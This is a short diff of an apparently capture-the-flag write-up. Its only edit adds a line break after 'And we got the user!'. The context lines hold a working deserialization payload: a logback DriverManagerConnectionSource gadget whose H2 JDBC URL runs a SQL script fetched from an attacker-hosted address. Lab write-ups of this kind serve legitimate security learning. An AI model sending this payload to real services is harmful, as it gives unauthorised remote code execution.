@@ -58,7 +58,7 @@ Then, start your listeners.<br>
 Now we can send the payload:
 <p>"["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.197/inject.sql'"}]"</p><br>
 
-And we got the user!
+And we got the user!<br>
 ![image](https://imgur.com/sramzmY.png "user flag")<br>
 
 <h1>Privilege Escalation</h1><br>
